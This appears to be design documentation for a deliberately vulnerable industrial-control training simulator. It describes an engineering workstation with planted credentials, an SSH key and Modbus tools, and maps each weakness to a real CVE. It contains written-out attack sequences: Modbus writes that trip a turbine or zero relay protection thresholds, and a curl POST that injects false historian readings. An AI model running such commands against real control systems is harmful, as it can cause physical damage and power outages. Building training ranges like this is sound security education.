# Engineering workstation

## Device description ENG-WS01

The UU P&L engineering workstation is the primary access point for PLC
configuration, relay threshold management, and firmware deployment across the
control zone. It is the machine Ponder Stibbons uses when something breaks at
three in the morning.

It is dual-homed: one interface on the operational network, one on the control
network. This gives it direct Modbus TCP access to every device in the control
zone without traversing any firewall. It exists because someone needed a way to
configure PLCs and IEDs from the operational zone, and giving the engineering
workstation both network interfaces was simpler than provisioning a dedicated
jump host for the control zone.

The container presents as a Windows 10 Enterprise LTSC system on the
`OT.LOCAL` domain. SSH drops the user into a PowerShell facade. The virtual
filesystem at `C:\Users\engineer\` contains project files, configuration
backups, Modbus tooling, and accumulated notes.

From an attacker's perspective, this is the highest-value machine in the
operational zone:

* it has unrestricted Modbus TCP access to the PLC, all relay IEDs, and all
  actuators in the control zone
* it contains explicit credentials for every device, written down in several
  places by an engineer who needed them accessible
* a 2019 backup archive contains a full network map with all operational zone
  and control zone credentials
* the pre-installed Modbus tools require no setup: an attacker can read and
  write PLC registers immediately after gaining a shell

## Container behaviour

The container exposes one network service:

* SSH on port 22: password authentication, Windows 10 LTSC facade shell

The shell presents `C:\Users\engineer\` as the working directory. Standard
PowerShell-style navigation works. The `python` command is available and
resolves scripts against the virtual filesystem path.

A cron job polls the turbine PLC every five minutes and appends the governor
setpoint to `/home/engineer/plc_poll.log`. This file accumulates on disk and
is discoverable.

Network interfaces visible in the facade:

```
Ethernet adapter Ethernet 0 (ics_operational):  10.10.2.30
Ethernet adapter Ethernet 1 (ics_control):      10.10.3.100
```

## Deliberately introduced vulnerabilities

### PLC project file with admin credentials

The file `C:\Users\engineer\Projects\PLC\turbine_controller.project` is an
exported HexSoft PLC Suite project file. It contains the PLC admin credentials
in the device section:


```ini
[device]
name             = hex_turbine_controller
ip               = 10.10.3.21
admin_pass       = turbineadmin
```

The same credential appears in the firmware update script on the Desktop and in
the firmware README, creating a multi-location credential deposit.

### 2019 backup archive with full network map

`C:\Users\engineer\backups\PLC_Backup_2019.tar.gz` is a compressed archive
from the 2019 relay IED installation. It contains two files:

`plc-access-2019.conf`: credentials for every device at time of archive:

```ini
[hex_turbine_controller]
admin = admin
pass  = turbineadmin

[historian]
db_pass  = Historian2015
notes    = SSH: hist_admin / Historian2015  (same password, don't tell IT)

[scada_server]
notes    = Current SSH: scada_admin / W1nd0ws@2016
```

`network_map_2019.txt`: a complete network map of both zones with hostnames,
IPs, usernames, and passwords in a single document.

The archive requires no password. The file extension `.tar.gz` is navigable
via `expand-archive` in the facade shell or extractable directly on any Linux
system.

### Desktop firmware script with hardcoded PLC password

`C:\Users\engineer\Desktop\update_plc_firmware.ps1` contains the PLC admin
credential in the script body:

```powershell
$AdminUser = "admin"
$AdminPass = "turbineadmin"
```

The script prints the password to stdout as part of its instructional output,
which means it appears in PSReadLine history if it was ever run.

### Engineering notes with explicit credential list

`C:\Users\engineer\Documents\engineering_notes.txt` is a plaintext notepad
file maintained by the engineer for operational convenience. It explicitly lists:

* historian URL and `Historian2015` credential
* SCADA web URL and `admin/admin`
* SCADA SSH: `scada_admin / W1nd0ws@2016`
* historian SSH: `hist_admin / Historian2015`
* relay IED web interfaces: `admin/relay1234` for both
* HMI SSH and web: `operator/operator`

The file's comment is: "DB credentials: historian / Historian2015  (never
changed, 'it's fine')".

### SSH private key in virtual filesystem

An RSA private key is generated at container start and placed at both
`/home/engineer/.ssh/id_rsa` (functional) and
`C:\Users\engineer\.ssh\id_rsa` (discoverable via shell browsing). The public
key is added to the engineer account's `authorized_keys`, and the `known_hosts`
file records the hostnames and IPs of systems the workstation has previously
connected to:

```
10.10.3.10  ssh-rsa ...   uupl-hmi
10.10.3.21  ssh-rsa ...   hex-turbine-plc
10.10.2.10  ssh-rsa ...   uupl-historian
10.10.2.20  ssh-rsa ...   distribution-scada
```

### Modbus tools with direct control zone access

The `Tools\` directory contains two functional Python scripts:

* `modbus_read.py`: reads coils, discrete inputs, holding registers, and
  input registers from any Modbus TCP device
* `modbus_write.py`: writes coils and holding registers to any Modbus TCP device

The tools use pymodbus 3.6.8. They require no configuration beyond the target
IP and address. The engineering workstation can reach every control zone device
directly, so an attacker who gains a shell can immediately:

```
python Tools\modbus_write.py 10.10.3.21 502 coil 0 1
```

This writes the emergency stop coil on the turbine PLC and trips the turbine.

### Relay configuration snapshots with threshold documentation

`Projects\RelayConfigs\relay_a_2019.txt` and `relay_b_2019.txt` document the
Modbus holding register map for both protective relay IEDs, including explicit
notes on what each threshold controls and the effect of manipulating it:

```
HR[0] undervoltage_threshold_v = 196  ; relay trips if V < this
HR[1] overcurrent_threshold_a  = 200  ; relay trips if I > this
HR[2] overspeed_threshold_rpm  = 3300 ; relay trips if RPM > this

# Reducing undervoltage threshold allows fault to persist without trip.
# Raising overcurrent threshold disables overcurrent protection.
```

## Real-world vulnerabilities / CVEs

| Weakness                              | CVE / Reference        | Notes                                                                           |
|---------------------------------------|------------------------|---------------------------------------------------------------------------------|
| Plaintext credentials in project file | CVE-2021-22681         | Rockwell FactoryTalk: credentials in project configuration files                |
| Credential dump in maintenance backup | CVE-2020-5777          | GE Proficy: archived config files contain plaintext credentials                 |
| Hardcoded credentials in scripts      | CVE-2019-10915         | Default or hardcoded credentials in industrial automation tooling               |
| Unencrypted backup archive            | CWE-312                | Cleartext storage of sensitive information                                      |
| Unprotected engineering workstation   | ICS-CERT Advisory      | Direct Modbus access from engineering host with no MFA or command logging       |
| SSH key accessible on filesystem      | CWE-732                | Incorrect permission assignment: private key readable from virtual filesystem  |
| Dual-homed pivot host                 | ICS-CERT ICSA-19-274   | Engineering workstations bridging OT network zones: documented incident pattern |

## Artefacts attackers should find

### Port scan

```
22/tcp  open  ssh
```

The SSH banner presents Windows 10 Enterprise LTSC on domain OT.LOCAL.
`whoami` returns `ot.local\engineer`. No other open ports.

### Network position discovery

```
ipconfig
```

Reveals two network interfaces: `10.10.2.30` (operational) and `10.10.3.100`
(control). The control zone subnet `10.10.3.0/24` is reachable directly.

### Credential discovery paths

Multiple paths to the same credentials, in approximate order of discovery
depth:

1. `Documents\engineering_notes.txt`: explicit list of all credentials
2. `config\plc-access.conf`: all control zone devices with IPs and protocols
3. `Projects\PLC\turbine_controller.project`: PLC admin password
4. `Desktop\update_plc_firmware.ps1`: PLC admin password again
5. `backups\PLC_Backup_2019.tar.gz` → extract → full network map + all passwords
6. PSReadLine history: prior `modbus_read.py` and `modbus_write.py` invocations

### Modbus tool usage

```powershell
python Tools\modbus_read.py 10.10.3.21 502 holding 0 4
python Tools\modbus_read.py 10.10.3.21 502 input 0 11
python Tools\modbus_write.py 10.10.3.21 502 holding 0 3000
```

## Engineering workstation folder tree

```
C:\Users\engineer\
├── config\
│   └── plc-access.conf             # all 9 control zone devices, IPs, protocols
├── Desktop\
│   └── update_plc_firmware.ps1     # admin_pass = "turbineadmin"
├── Documents\
│   └── engineering_notes.txt       # explicit credential list for all systems
├── Tools\
│   ├── modbus_read.py              # pymodbus 3.6.8 read utility
│   ├── modbus_write.py             # pymodbus 3.6.8 write utility
│   └── send_alarm.ps1              # SMTP: plantmail123
├── Projects\
│   ├── PLC\
│   │   └── turbine_controller.project  # admin_pass = turbineadmin, full register map
│   ├── RelayConfigs\
│   │   ├── relay_a_2019.txt        # HR[0-2] thresholds + manipulation notes
│   │   └── relay_b_2019.txt
│   └── Firmware\
│       └── README.txt              # firmware update procedure, PLC creds in plain
├── backups\
│   └── PLC_Backup_2019.tar.gz      # full network map + all zone credentials
├── .ssh\
│   ├── id_rsa                      # RSA private key (no passphrase)
│   ├── id_rsa.pub
│   └── known_hosts                 # 10.10.3.10, 10.10.3.21, 10.10.2.10, 10.10.2.20
└── AppData/…/PSReadLine/
    └── ConsoleHost_history.txt     # modbus_read, modbus_write, ssh, curl, nmap history

/home/engineer/
└── plc_poll.log                    # governor setpoint readings every 5 min
```

Example content snippets:

* `Documents\engineering_notes.txt`

  ```
  Historian:
    http://10.10.2.10:8080/report?asset=turbine_rpm&from=2026-01-01&to=2026-02-01
    DB credentials: historian / Historian2015  (never changed, "it's fine")

  SCADA:
    http://10.10.2.20:8080/  login: admin / admin
    SSH:  scada_admin@10.10.2.20  password: W1nd0ws@2016
  ```

* `Projects\RelayConfigs\relay_a_2019.txt`

  ```
  HR[0] undervoltage_threshold_v = 196  ; relay trips if V < this
  HR[1] overcurrent_threshold_a  = 200  ; relay trips if I > this
  # Raising overcurrent threshold disables overcurrent protection.
  ```

## Role in the simulator

The engineering workstation is the final pivot before the control zone. It has
direct Modbus TCP access to the turbine PLC, both relay IEDs, the revenue meter,
and all four actuators. It also contains tools, credentials, and configuration
data that make the control zone immediately accessible without any further
exploitation.

An attacker who reaches this machine has effectively reached the physical process.

```
compromise engineering workstation (engineer:spanner99 or pivot from bursar-desk)
        ↓
plc-access.conf → full device list with IPs and protocols
        ↓
modbus_read.py 10.10.3.21 502 input 0 11
        → read live turbine RPM, temperature, pressure, voltages, currents
        ↓
modbus_write.py 10.10.3.21 502 coil 0 1
        → write emergency stop → turbine trips immediately

--- OR ---

relay_a_2019.txt → learn HR[0]=undervoltage threshold=196V
modbus_write.py 10.10.3.31 502 holding 0 0
        → set undervoltage threshold to 0V
        → relay A immediately sees undervoltage on current feeder voltage
        → relay A trips Feeder A (Dolly Sisters) without touching the PLC

--- OR ---

modbus_write.py 10.10.3.21 502 holding 3 0
        → set overcurrent threshold to 0A on PLC
        → relay IEDs receive updated threshold via their polling loop
        → both relays immediately detect overcurrent → both feeders trip

--- OR (persistent disruption) ---

engineering_notes.txt → historian ingest: hist_read/history2017
curl -u hist_read:history2017 -X POST http://10.10.2.10:8080/ingest \
     -H "Content-Type: application/json" \
     -d '{"timestamp":"2026-03-09T00:00:00","asset":"line_voltage_a",
          "value":150,"unit":"V"}'
        → SCADA dashboard shows undervoltage on Feeder A
        → ops team investigates phantom fault while real attack proceeds
```
